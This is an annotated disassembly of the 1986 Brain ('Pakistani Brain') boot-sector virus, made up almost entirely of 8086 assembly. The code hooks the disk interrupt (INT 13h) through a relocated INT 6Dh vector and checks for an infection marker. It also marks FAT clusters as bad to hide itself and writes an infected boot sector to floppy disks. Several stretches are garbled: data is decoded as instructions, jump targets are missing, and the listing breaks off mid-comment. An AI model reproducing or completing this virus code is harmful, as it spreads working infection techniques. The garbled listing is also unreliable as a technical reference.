The "Pakistani Brain"


;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
CODE     SEGMENT PUBLIC 'CODE'         ;
    ASSUME CS:CODE,DS:CODE,ES:CODE,SS:NOTHING
                        ;
         ORG  0         ;
                        ;
BPB      EQU  3+8       ;JMP + OEM_NAME
                        ;
;-----------------------------------------------------------------------;
; COPY OF BOOT SECTOR                                 ;
;-----------------------------------------------------------------------;
                        ;
         DB   6 DUP (?) ;
                        ;
L0006         DB   ?         ;HEAD
L0007         DB   ?         ;SECTOR
L0008         DB   ?         ;TRACK
                        ;
L0009         DB   ?         ;HEAD
L000A         DB   ?         ;SECTOR
L000B         DB   ?         ;TRACK
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
                        ;
    ORG  512            ;
                        ;
;-----------------------------------------------------------------------;
; (BOOT SECTOR TYPE FORMAT!)                          ;
;-----------------------------------------------------------------------;
CONTINUE:     JMP  CONTINUE_2     ;023C 
                        ;
L0203         DB   'IBM X3.2'     ;OEM NAME AND VERSION
                        ;
         DW   512       ;BYTES PER SECTOR
         DB   2         ;SECTORS PER ALLOCATION UNIT
         DW   1         ;RESERVED SECTORS
L0210         DB   2         ;NUMBER OF FATS
         DW   112       ;NUMBER OF ROOT DIR ENTRIES
         DW   2D0H      ;SECTORS PER DISK
         DB   0FDH      ;MEDIA ID
         DW   2         ;SECTORS PER FAT
         DW   9         ;SECTORS PER TRACK
         DW   2         ;NUMBER OF HEADS
         DW   0         ;HIDDEN SECTORS
                        ;
;---------------------------------------;
         DB   0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

         DB   2
DISK_PARM     DB   0DFH,2,25H,2,12H,2AH,0FFH,50H,0F6H,0,2

;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
REBOOT:  INT  19H            ;REBOOT
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
CONTINUE_2:                  ;
    CLI                 ;
    XOR  AX,AX               ;
    MOV  ES,AX               ;ES=0
    MOV  SS,AX               ;SS:SP = 0000:7C00
    MOV  SP,7C00H       ;
    MOV  DS,AX               ;
    MOV  BX,07C0H       ;INITIALIZE DISK POINTER (INT 1E)
    MOV  Word Ptr [78H],2FH  ;0000:0078 = (DWORD) 07C0:002F
    MOV  [7AH],BX       ;
                        ;
    MOV  DS,BX               ;DS = 07C0
    MOV  DX,[1EH]       ;GET DRIVE/HEAD          ;BOOT:001E !
    MOV  [20H],DL       ;SAVE DRIVE         ;BOOT:0020 !
    INT  13H            ;RESET
    JNB  C_10           ;
    JMP  ERROR_2             ;IF ERROR...'BOOT FAILURE'
                        ;
C_10:    MOV  SI,BPB              ;SI = BPB      ;BOOT:000B
    MOV  CX,[SI]             ;CX = BYTES PER SECTOR
    SHR  CH,1           ;WORDS PER SECTOR
    XCHG CH,CL               ;
    MOV  [2BH],CX       ;SAVE               ;BOOT:002B
    MOV  AL,[SI+5]      ;AL= NUMBER OF FATS ;BOOT:0010
    XOR  AH,AH               ;
    MUL  Word Ptr [SI+0BH]   ;TOTAL FAT SECTORS  ;BOOT:0016
    ADD  AX,[SI+3]      ;+RESERVED SECTORS  ;BOOT:000E
    ADD  AX,[SI+11H]         ;+HIDDEN SECTORS    ;BOOT:001C
    MOV  [24H],AX       ;SAVE IT       ;BOOT:0024
    MOV  BX,7E00H       ;
    CALL UI             ;
                        ;
    MOV  BX,ES               ;SAVE ES
    MOV  AX,70H              ;ES=0070H
    MOV  ES,AX               ;
    MOV  AX,32               ;32*
    MUL  Word Ptr [SI+6]          ;   ROOT DIR ENTRIES+
    MOV  CX,[SI]             ;
    ADD  AX,CX               ;                    BYTES/SECTOR
    DEC  AX             ;                                -1
    DIV  CX             ;                         /BYTES/SECTOR
    ADD  [24H],AX       ;ADD TO BYTES IN BOOT & FAT
                        ;
    MOV  CL,[2AH]       ;
    MOV  AX,[24H]       ;
    CALL READ_CLUSTER        ;(READ BOOT SECTOR ???)
                        ;
    PUSH ES             ;
    POP  DS             ;
    JMP  0070H:0000H         ;(PASS CONTROL TO ???)
                        ;
;-----------------------------------------------------------------------;
; HEAVY CRUNCHING HERE (CLUSTER READS ?!?!?!)                   ;
; ON ENTRY:   AX = ?
;            ES:BX = DTA                              ;
;        CL = ?                                  ;
;        DS:SI = BPB                             ;
;    DS:[0021] =                                 ;
;-----------------------------------------------------------------------;
READ_CLUSTER:                ;02B3
    PUSH BX             ;
    PUSH AX             ;
                        ;
    MOV  AL,CL               ;
    MUL  Byte Ptr [2BH]      ;
    MOV  [29H],AL       ;
    POP  AX             ;
    MUL  Word Ptr [2BH]      ;
    DIV  Word Ptr [SI+0DH]   ;(BPB.SECTORS PER TRACK)
    INC  DL             ;
    MOV  [28H],DL       ;
    PUSH DX             ;
    XOR  DX,DX               ;
    DIV  Word Ptr [SI+0FH]   ;(BPB.NUMBER OF HEADS)
    MOV  [21H],DL       ;
    MOV  [26H],AX       ;
    POP  DX             ;
RC_10:   MOV  CL,[29H]       ;
    ADD  DL,CL               ;
    MOV  AX,[SI+0DH]         ;(BPB.SECTORS PER TRACK)
    INC  AX             ;
    CMP  DL,AL               ;
    JBE  RC_20               ;
    SUB  AL,[28H]       ;
    MOV  CL,AL               ;
RC_20:   MOV  AL,CL               ;
    MOV  DX,[26H]       ;
    MOV  CL,6           ;
    SHL  DH,CL               ;
    OR   DH,[28H]       ;
    MOV  CX,DX               ;
    XCHG CH,CL               ;
    MOV  DX,[20H]       ;
                        ;
    MOV  AH,2           ;READ SECTOR
    PUSH AX             ;
    INT  13H            ;
    POP  AX             ;
    JB   ERROR_2             ;IF ERROR...'BOOT FAILURE'
    SUB  [29H],AL       ;
    JBE  RC_90               ;
    CBW                 ;
    MUL  Word Ptr [2DH]      ;
    ADD  BX,AX               ;
    INC  Byte Ptr [21H]      ;
    MOV  DL,[21H]       ;
    CMP  DL,[SI+0FH]         ;
    MOV  DL,1           ;
    MOV  [28H],DL       ;
    JB   RC_10               ;
    MOV  Byte Ptr [21H],0    ;
    INC  Word Ptr [26H]      ;
    JMP  RC_10               ;
                        ;
RC_90:   POP  BX             ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
; PRINT BOOT ERROR MESSAGE AND WAIT FOR A KEY                   ;
;-----------------------------------------------------------------------;
ERROR_1:                ;0339
    MOV  SI,01B3H       ;'Non-System disk'
    JMP  E_10           ;
                        ;
;---------------------------------------;
ERROR_2:                ;
    MOV  SI,01C5H       ;'BOOT failure'
E_10:    CALL DISPLAY_STRING      ;
                        ;
    MOV  SI,01D4H       ;'Replace and press any key when ready'
    CALL DISPLAY_STRING      ;
                        ;
    MOV  AH,0           ;WAIT FOR A KEY
    INT  16H            ;
E_20:    MOV  AH,1           ;   THROW IT AWAY AND
    INT  16H            ;   WAIT FOR ANOTHER ONE BUT
    JNZ  E_20           ;   DONT GET IT
    JMP  REBOOT              ;
                        ;
;-----------------------------------------------------------------------;
; DISPLAY ASCIIZ STRING                               ;
; ON ENTRY:   DS:SI = ASCIIZ STRING                        ;
;-----------------------------------------------------------------------;
DISPLAY_STRING:                   ;0357
DS_00:   LODSB                    ;DISPLAY UNTIL NULL
    OR   AL,AL               ;
    JZ   DS_90               ;
    MOV  AH,0EH              ;
    MOV  BX,7           ;
    INT  10             ;
    JMP  DS_00               ;
DS_90:   RET                 ;0365
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
UI:                     ;0366:
    MOV  CL,01               ;
    CALL READ_CLUSTER        ;
                        ;
    PUSH SI             ;
    MOV  DI,BX               ;
    MOV  AX,ES:[BX+1C]       ;
    XOR  DX,DX               ;
    DIV  Word Ptr [SI]       ;
    INC  AL             ;
    MOV  [002A],AL      ;
    MOV  SI,019D             ;
    MOV  CX,000B             ;
    REPZ                ;
    CMPSB                    ;
    JNZ  ERROR_1             ;'NON SYSTEM DISK'
    MOV  AX,ES:[BX+3A]       ;
    MOV  [0022],AX      ;
    MOV  DI,BX               ;
    ADD  DI,+20              ;
    MOV  SI,01A8             ;
    MOV  CX,000B             ;
    REPZ                ;
    CMPSB                    ;
    JNZ  ERROR_1             ;'NON SYSTEM DISK'
    POP  SI             ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
L039D    DB   'IBMBIO  COM'
    DB   'IBMDOS  COM'
    DB   CR,LF,'Non-System disk',0
    DB   CR,LF,'BOOT failure',0
    DB   CR,LF,'Replace and press any key when ready',0
    DB   90H,90H,90H,55H,0AAH

;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
L0400:   JMP  SHORT CONT_A        ;
                        ;
    DB   '(c) 1986 Basit & Amjads (pvt) Ltd ',0
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
CONT_A:                      ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
L0A5B    DB   'IBMBIO  COM'
    DB   'IBMDOS  COM'
    DB   CR,LF,'Non-System disk',0
    DB   CR,LF,'BOOT failure',0
    DB   CR,LF,'Replace and press any key when ready',0
    DB   90H,90H,90H,55H,0AAH

;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    ADD  AL,00               ;0425 0400
    ADD  [06C6],CH      ;0427 002EC606
    AND  AX,1F02             ;042B 25021F
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
REDIRECT_13:                 ;042E
    XOR  AX,AX               ;GET INT 13 VECTOR
    MOV  DS,AX               ;
    MOV  AX,[004CH]          ;
    MOV  [01B4H],AX          ;   (SAVE IT TO INT 6D VECTOR)
    MOV  AX,[004EH]          ;
    MOV  [01B6H],AX          ;
    MOV  AX,0276H       ;SET INT 13 VECTOR
    MOV  [004CH],AX          ;
    MOV  AX,CS               ;
    MOV  [004EH],AX          ;
                        ;
    MOV  CX,0004             ;RETRY = 4
    XOR  AX,AX               ;
    MOV  ES,AX               ;
L0450:   PUSH CX             ;
    MOV  DH,CS:[0006]        ;DH = HEAD
    MOV  DL,00               ;DRIVE A:
    MOV  CX,CS:[0007]        ;CX = TRACK/SECTOR
    MOV  AX,0201             ;READ 1 SECTOR
    MOV  BX,7C00             ;ES:BX == DTA = 0000:7C00
    INT  6DH            ;
    JNB  L0470               ;
    MOV  AH,00               ;RESET
    INT  6DH            ;
    POP  CX             ;TRY AGAIN
    LOOP L0450               ;
    INT  18H            ;LOAD BASIC
                        ;
L0470:   JMP  0000:7C00      ;JUMP TO BOOT LOADER ?!?!
                        ;
    NOP                 ;0475 90
    STI                 ;0476 FB
    CMP  AH,02               ;0477 80FC02
    JNZ  L0494               ;047A 7518
    CMP  DL,02               ;047C 80FA02
    JA   L0494               ;047F 7713
    CMP  CH,00               ;0481 80FD00
    JNZ  L048B               ;0484 7505
    CMP  DH,00               ;0486 80FE00
    JZ   L0497               ;0489 740C
L048B:   DEC  Byte Ptr CS:[0225]  ;048B 2EFE0E2502
    JNZ  L0494               ;0490 7502
    JMP  L0497               ;0492 EB03
L0494:   JMP  L053C               ;0494 E9A500
L0497:   MOV  Byte Ptr CS:[0227],00    ;0497 2EC606270200
    MOV  Byte Ptr CS:[0225],04    ;049D 2EC606250204
    PUSH AX             ;04A3 50
    PUSH BX             ;04A4 53
    PUSH CX             ;04A5 51
    PUSH DX             ;04A6 52
    MOV  CS:[0226],DL        ;04A7 2E88162602
    MOV  CX,0004             ;04AC B90400
    PUSH CX             ;04AF 51
    MOV  AH,00               ;04B0 B400
    INT  6D             ;04B2 CD6D
    JB   ;04CB               ;04B4 7215
    MOV  DH,00               ;04B6 B600
    MOV  CX,0001             ;04B8 B90100
    MOV  BX,06BE             ;04BB BBBE06
    PUSH ES             ;04BE 06
    MOV  AX,CS               ;04BF 8CC8
    MOV  ES,AX               ;04C1 8EC0
    MOV  AX,0201             ;04C3 B80102
    INT  6D             ;04C6 CD6D
    POP  ES             ;04C8 07
    JNB  ;04D1               ;04C9 7306
    POP  CX             ;04CB 59
    LOOP ;04AF               ;04CC E2E1
    JMP  ;04FF               ;04CE EB2F
    NOP                 ;04D0 90
    POP  CX             ;04D1 59
    MOV  AX,CS:[06C2]        ;04D2 2EA1C206
    CMP  AX,1234             ;04D6 3D3412
    JNZ  ;04E3               ;04D9 7508
    MOV  Byte Ptr CS:[0227],01    ;04DB 2EC606270201
    JMP  ;0503               ;04E1 EB20
    PUSH DS             ;04E3 1E
    PUSH ES             ;04E4 06
    MOV  AX,CS               ;04E5 8CC8
    MOV  DS,AX               ;04E7 8ED8
    MOV  ES,AX               ;04E9 8EC0
    PUSH SI             ;04EB 56
    CALL L0804               ;04EC E81503
    JB   ;04FA               ;04EF 7209
    MOV  Byte Ptr CS:[0227],02    ;04F1 2EC606270202
    CALL L06B2               ;04F7 E8B801
    POP  SI             ;04FA 5E
    POP  ES             ;04FB 07
    POP  DS             ;04FC 1F
    JNB  ;0503               ;04FD 7304
    MOV  AH,00               ;04FF B400
    INT  6D             ;0501 CD6D
    POP  DX             ;0503 5A
    POP  CX             ;0504 59
    POP  BX             ;0505 5B
    POP  AX             ;0506 58
    CMP  CX,+01              ;0507 83F901
    JNZ  L053C               ;050A 7530
    CMP  DH,00               ;050C 80FE00
    JNZ  L053C               ;050F 752B
    CMP  Byte Ptr CS:[0227],01    ;0511 2E803E270201
    JNZ  ;052A               ;0517 7511
    MOV  CX,CS:[06C5]        ;0519 2E8B0EC506
    MOV  DX,CS:[06C3]        ;051E 2E8B16C306
    MOV  DL,CS:[0226]        ;0523 2E8A162602
    JMP  L053C               ;0528 EB12
    CMP  Byte Ptr CS:[0227],02    ;052A 2E803E270202
    JNZ  L053C               ;0530 750A
                        ;
    MOV  CX,CS:[0007]        ;CX = TRACK/SECTOR
    MOV  DH,CS:[0006]        ;DH = HEAD
L053C:   INT  6DH            ;
    RETF 2              ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
L0541    DB   0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
L0550:   JMP  CONTINUE_3          ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
L0553    DW   3              ;
    DB   ' (c) 1986 Basit & Amjads (pvt) Ltd'
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
CONTINUE_3:                  ;0577
    CALL READ_VERIFY         ;READ VERIFY
    MOV  AX,[06BEH]          ;IF ??? == DOUBLD SIDED 9 SECTORS...
    CMP  AX,0FFFDH      ;
    JE   L0586               ;...CONTINUE
    MOV  AL,3           ;ELSE RETURN ??? ERROR
    STC                 ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
L0586:                       ;0586
    MOV  CX,0037             ;
    MOV  Word Ptr [0353],0000     ;
    CALL ;05F8               ;058F E86600
    CMP  AX,0000             ;0592 3D0000
    JNZ  ;05A5               ;0595 750E
    INC  Word Ptr [0353]          ;0597 FF065303
    CMP  Word Ptr [0353],+03 ;059B 833E530303
    JNZ  ;05AB               ;05A0 7509
    JMP  ;05B6               ;05A2 EB12
    NOP                 ;05A4 90
    MOV  Word Ptr [0353],0000     ;05A5 C70653030000
    INC  CX             ;05AB 41
    CMP  CX,0163             ;05AC 81F96301
    JNZ  ;058F               ;05B0 75DD
    MOV  AL,01               ;05B2 B001
    STC                 ;05B4 F9
    RET                 ;05B5 C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    MOV  DL,03               ;05B6 B203
    CALL ;05CB               ;05B8 E81000
    DEC  CX             ;05BB 49
    DEC  DL             ;05BC FECA
    JNZ  ;05B8               ;05BE 75F8
    INC  CX             ;05C0 41
    CALL CONVERT_1      ;CLUSTER TO TRACK/SECTOR/HEAD
    CALL ;062D               ;05C4 E86600
    MOV  AL,00               ;05C7 B000
    CLC                 ;05C9 F8
    RET                 ;05CA C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    PUSH CX             ;05CB 51
    PUSH DX             ;05CC 52
    MOV  SI,06BE             ;05CD BEBE06
    MOV  AL,CL               ;05D0 8AC1
    SHR  AL,1           ;05D2 D0E8
    JB   ;05E4               ;05D4 720E
    CALL FUNCTION_1          ;BX = (CX*3)/2
    MOV  AX,[BX+SI]          ;05D9 8B00
    AND  AX,F000             ;05DB 2500F0
    OR   AX,0FF7             ;05DE 0DF70F
    JMP  ;05EF               ;05E1 EB0C
    NOP                 ;05E3 90
    CALL FUNCTION_1          ;BX = (CX*3)/2
    MOV  AX,[BX+SI]          ;05E7 8B00
    AND  AX,000F             ;05E9 250F00
    OR   AX,FF70             ;05EC 0D70FF
    MOV  [BX+SI],AX          ;05EF 8900
    MOV  [BX+SI+0400],AX          ;05F1 89800004
    POP  DX             ;05F5 5A
    POP  CX             ;05F6 59
    RET                 ;05F7 C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    PUSH CX             ;05F8 51
    MOV  SI,06BE             ;05F9 BEBE06
    MOV  AL,CL               ;05FC 8AC1
    SHR  AL,1           ;05FE D0E8
    JB   L060D               ;0600 720B
    CALL FUNCTION_1          ;BX = (CX*3)/2
    MOV  AX,[BX+SI]          ;0605 8B00
    AND  AX,0FFF             ;0607 25FF0F
    JMP  L0619               ;060A EB0D
                        ;
L060D:   CALL FUNCTION_1          ;BX = (CX*3)/2
    MOV  AX,[BX+SI]          ;0610 8B00
    AND  AX,FFF0             ;0612 25F0FF
    MOV  CL,04               ;0615 B104
    SHR  AX,CL               ;0617 D3E8
L0619:   POP  CX             ;0619 59
    RET                 ;061A C3
                        ;
;-----------------------------------------------------------------------;
; BX = (CX*3)/2                                       ;
;-----------------------------------------------------------------------;
FUNCTION_1:                  ;061B
    PUSH DX             ;
    MOV  AX,3           ;
    MUL  CX             ;
    SHR  AX,1           ;
    MOV  BX,AX               ;
    POP  DX             ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
READ_VERIFY:                 ;0627
    MOV  AH,2           ;
    CALL VERIFY_SECTORS      ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
WRITE_VERIFY:                ;062D
    MOV  AH,03               ;
    CALL VERIFY_SECTORS      ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
VERIFY_SECTORS:                   ;0633
    MOV  CX,4           ;RETRY = 4
L0636:   PUSH CX             ;
    PUSH AX             ;
    MOV  AH,0           ;REST
    INT  6DH            ;
    POP  AX             ;
    JB   L0653               ;
    MOV  BX,offset L06BEH    ;
    MOV  AL,4           ;4==VERIFY
    MOV  DH,00               ;HEAD 0
    MOV  DL,[0226]      ;DRIVE DL
    MOV  CX,0002             ;TRACK 0/SECTOR 2
    PUSH AX             ;
    INT  6DH            ;
    POP  AX             ;
    JNB  L065C               ;IF ERROR...EXIT
L0653:   POP  CX             ;
    LOOP L0636               ;RETRY
    POP  AX             ;
    POP  AX             ;
    MOV  AL,2           ;BAD ADDRESS MARK ???
    STC                 ;RETURN ERROR
    RET                 ;
                        ;
L065C:   POP  CX             ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
; CONVERT CLUSTERS TO TRACK/SECTOR/HEAD ????                    ;
;-----------------------------------------------------------------------;
CONVERT_1:                   ;065E
    PUSH CX             ;
    SUB  CX,2           ;
    SHL  CX,1           ;WORD PTR
    ADD  CX,9*2              ;   (SECTORS PER CYLINDER ???)
    MOV  AX,CX               ;
    MOV  CL,9*2              ;   (SECTORS PER CYLINDER ???)
    DIV  CL             ;
    MOV  DS:[0008],AL        ;AL = TRACK
    MOV  Byte Ptr DS:[0006],0     ;INC. HEAD
    INC  AH             ;INC. SECTOR
    CMP  AH,9           ;IF TOO BIG...
    JBE  L0684               ;
    SUB  AH,9           ;...START AT ZERO
    MOV  Byte Ptr DS:[0006],1     ;INC. HEAD
L0684:   MOV  DS:[0007],AH        ;
    POP  CX             ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    ADD  [BX+SI],AL          ;068A 0000
    ADD  [BX+SI],AL          ;068C 0000
    ADD  [BX+SI],AL          ;068E 0000
    ADD  BP,[SI+00]          ;0690 036C00
    ADD  AX,[BP+DI]          ;0693 0303
    MOV  SI,010E             ;0695 BE0E01
    ADD  [BX+SI],AL          ;0698 0000
    ADD  AX,SP               ;069A 01E0
    FCOMP     DWord Ptr [DI+E0D7] ;069C D89DD7E0
    LAHF                ;06A0 9F
    LEA  BX,[BX+SI+8E9F]          ;06A1 8D989F8E
    LOOPNZ    ;06C7               ;06A5 E020
    SUB  [BP+DI+29],AH       ;06A7 286329
    AND  [BP+SI+72],AL       ;06AA 204272
    POPA                ;06AD 61
    IMUL BP,[BP+20],E824          ;06AE 696E2024E8
    FILD DWord Ptr [BX+SI]   ;06B3 DB00
    JB   L06C1               ;06B5 720A
    PUSH DI             ;06B7 57
    CALL ;06DA               ;06B8 E81F00
    POP  DI             ;06BB 5F
    JB   L06C1               ;06BC 7203
    CALL WRITE_RBF      ;WRITE ROOT BOOT FAT
L06C1:   RET                 ;06C1 C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    MOV  BX,049B             ;06C2 BB9B04
    MOV  CX,000B             ;
L06C8:   MOV  AL,[BX]             ;
    NEG  AL             ;
    MOV  [SI],AL             ;
    INC  SI             ;
    INC  BX             ;
    LOOP L06C8               ;
                        ;
    MOV  AL,08               ;
    MOV  [SI],AL             ;
    CLC                 ;
    RET                 ;06D7 C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    MOV  Byte Ptr [06C7],91  ;06D8 C606C70691
    ADD  AL,6C               ;06DD 046C
    ADD  [BP+06FE],BH        ;06DF 00BEFE06
    MOV  [0493],DX      ;06E3 89169304
    MOV  AX,[0491]      ;06E7 A19104
    SHR  AX,1           ;06EA D1E8
    MOV  [0497],AX      ;06EC A39704
    SHR  AX,1           ;06EF D1E8
    MOV  [0495],AX      ;06F1 A39504
    XCHG AX,CX               ;06F4 91
    AND  CL,43               ;06F5 80E143
    MOV  DI,[0495]      ;06F8 8B3E9504
    ADD  DI,01E3             ;06FC 81C7E301
    MOV  AL,[SI]             ;0700 8A04
    CMP  AL,00               ;0702 3C00
    JZ   ;071B               ;0704 7415
    MOV  AL,[SI+0B]          ;0706 8A440B
    AND  AL,08               ;0709 2408
    CMP  AL,08               ;070B 3C08
    JZ   ;071B               ;070D 740C
    ADD  SI,+20              ;070F 83C620
    DEC  Word Ptr [0491]          ;0712 FF0E9104
    JNZ  ;0700               ;0716 75E8
    STC                 ;0718 F9
    RET                 ;0719 C3
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
:                       ;071A
    MOV  CX,[BP+DI+331D]          ;
    PUSH DS             ;071E 1E
    XCHG AX,DI               ;071F 97
    ADD  AL,89               ;0720 0489
    XCHG AX,DI               ;0722 3697
    ADD  AL,FA               ;0724 04FA
    MOV  AX,SS               ;0726 8CD0
    MOV  SS:[0493],AX        ;0728 A39304
    MOV  [0495],SP      ;072B 89269504
    MOV  AX,CS               ;072F 8CC8
    MOV  SS,AX               ;0731 8ED0
    MOV  SP,[0497]      ;0733 8B269704
    ADD  SP,+0C              ;0737 83C40C
    MOV  CL,51               ;073A B151
    ADD  DX,444C             ;073C 81C24C44
    MOV  DI,2555             ;0740 BF5525
    MOV  CX,0C03             ;0743 B9030C
    REPZ                ;0746 F3
    CMPSW                    ;0747 A7
    MOV  AX,0B46             ;0748 B8460B
    MOV  CX,0003             ;074B B90300
    ROL  AX,CL               ;074E D3C0
    MOV  [0497],AX      ;0750 A39704
    MOV  CX,0005             ;0753 B90500
    MOV  DX,0008             ;0756 BA0800
    SUB  Word Ptr [0497],5210     ;0759 812E97041052
    PUSH [0497]              ;075F FF369704
L0763:   MOV  AH,[BX]             ;0763 8A27
    INC  BX             ;0765 43
    MOV  DL,AH               ;0766 8AD4
    SHL  DL,1           ;0768 D0E2
    JB   L0763               ;076A 72F7
L076C:   MOV  DL,[BX]             ;076C 8A17
    INC  BX             ;076E 43
    MOV  AL,DL               ;076F 8AC2
    SHL  DL,1           ;0771 D0E2
    JB   L076C               ;0773 72F7
    ADD  AX,1D1D             ;0775 051D1D
    PUSH AX             ;0778 50
    INC  Word Ptr [0497]          ;0779 FF069704
    JNB  L0780               ;077D 7301
    JMP  268B:E1E2      ;077F EAE2E18B26
                        ;
    XCHG AX,BP               ;0784 95
    ADD  AL,A1               ;0785 04A1
    XCHG AX,BX               ;0787 93
    ADD  AL,8E               ;0788 048E
    SAR  BL,1           ;078A D0FB
    ADD  DH,[BP+SI]          ;078C 0232
    CLC                 ;078E F8
    RET                 ;078F C3
                        ;
;-----------------------------------------------------------------------;
; READ ROOT, BOOT, FIRST FAT                          ;
;-----------------------------------------------------------------------;
READ_RBF:                    ;0790
    MOV  Byte Ptr [0490],02  ;COMMAND = READ
    JMP  ROOT_BOOT_FAT       ;DO IT
                        ;
;-----------------------------------------------------------------------;
; WRITE ROOT, BOOT, FIRST FAT                              ;
;-----------------------------------------------------------------------;
WRITE_RBF:                   ;0798
    MOV  Byte Ptr [0490],03  ;COMMAND = WRITE
    JMP  ROOT_BOOT_FAT       ;DO IT
                        ;
;-----------------------------------------------------------------------;
; READ OR WRITE ROOT, BOOT, FIRST FAT                      ;
;-----------------------------------------------------------------------;
ROOT_BOOT_FAT:                    ;07A0
    MOV  DH,0           ;HEAD = 0
    MOV  DL,[226H]      ;DL = DRIVE
    MOV  CX,6           ;(TRACK 0/SECTOR 6) == ENTIRE ROOT DIR
    MOV  AH,[490H]      ;AH = COMMAND
    MOV  AL,4           ;4 SECTORS
    MOV  BX,6BEH             ;ES:BX = DTA
    CALL RESET_DO_IT         ;GO TO DISK
    JB   L07C9               ;IF ERROR...EXIT
                        ;
    MOV  CX,1           ;(TRACK 0/SECTOR 1) == BOOT & FAT1
    MOV  DH,1           ;HEAD 1
    MOV  AH,[490H]      ;AH = COMMAND
    MOV  AL,3           ;3 SECTORS
    ADD  BX,800H             ;ES:BX = DTA
    CALL RESET_DO_IT         ;GO TO DISK
L07C9:   RET                 ;
                        ;
;-----------------------------------------------------------------------;
; RESET DRIVE BEFORE DOING SPECIFIED FUNCTION                   ;
;-----------------------------------------------------------------------;
RESET_DO_IT:                 ;07CA
    MOV  [0493],AX      ;
    MOV  [0495],BX      ;SAVE REGs
    MOV  [0497],CX      ;
    MOV  [0499],DX      ;
    MOV  CX,0004             ;RETRY COUNT = 4
                        ;
RDI_10:  PUSH CX             ;
    MOV  AH,00               ;REST DRIVE
    INT  6D             ;
    JB   RDI_80              ;IF ERROR...RETRY
    MOV  AX,[0493]      ;RESTORE REGs
    MOV  BX,[0495]      ;
    MOV  CX,[0497]      ;
    MOV  DX,[0499]      ;
    INT  6D             ;DO SPECIFIED FUNCTION
    JNB  RDI_90              ;IF NO ERROR...EXIT
RDI_80:  POP  CX             ;
    LOOP RDI_10              ;RETRY
    STC                 ;RETURN ERROR
    RET                 ;
                        ;
RDI_90:  POP  CX             ;RETURN NO ERROR
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
    ADD  [BX+SI],AL          ;07FD 0000
    ADD  [BP+DI],AL          ;07FF 0003
    ADD  [BX+DI],AL          ;0801 0001

L0804: ?!?!




    ADD  BP,AX               ;0803 03E8
    DEC  CX             ;0805 49
    STD                 ;0806 FD
    JB   ;085D               ;0807 7254
                        ;
    MOV  Word Ptr [000A],0001     ;
    MOV  Byte Ptr [0009],00  ;
    MOV  BX,06BE             ;ES:BX = DTA ?
    CALL READ_SECTORS        ;
                        ;
    MOV  BX,06BE             ;BX = DTA
    MOV  AX,[0007]      ;GET SECTOR TRACK
    MOV  [000A],AX      ;SAVE SECTOR/TRACK
    MOV  AH,[0006]      ;GET HEAD
    MOV  [0009],AH      ;SAVE HEAD
    CALL WRITE_SECTORS       ;WRITE SECTOR(S)
    CALL NEXT_SECTOR         ;POINT TO NEXT
                        ;
    MOV  CX,0005             ;CX = ???
    MOV  BX,0200             ;BX = DTA
L0837:   MOV  [0600],CX      ;SAVE ???
    CALL WRITE_SECTORS       ;WRITE SECTOR(S)
    CALL NEXT_SECTOR         ;POINT TO NEXT
    ADD  BX,512              ;DTA += 512
    MOV  CX,[0600]      ;???
    LOOP L0837               ;LOOP 5 TIMES ???
                        ;
    MOV  Byte Ptr [0009],00  ;HEAD = 0
    MOV  Word Ptr [000A],0001     ;TRACK/SECTOR = 0/1
    MOV  BX,0000             ;DTA = INFECTED BOOT SECTOR
    CALL WRITE_SECTORS       ;WRITE INFECTED BOOT SECTOR
    CLC                 ;
    RET                 ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
READ_SECTORS:                ;085E
    MOV  Word Ptr [0602H],0201H   ;READ CMD/1 SECTOR
    JMP  DO_SECTORS          ;
                        ;
;-----------------------------------------------------------------------;
;                                           ;
;-----------------------------------------------------------------------;
WRITE_SECTORS:                    ;0867
    MOV  Word Ptr [0602H],0301H   ;WRITE CMD/1 SECTOR
    JMP  DO_SECTORS          ;
                        ;
;-----------------------------------------------------------------------;
; READ OR WRITE SOME SECTORS WITH A RETRY COUNT OF 4            ;
;                                           ;
; ON ENTRY:   DS:[601H] = COMMAND                     ;
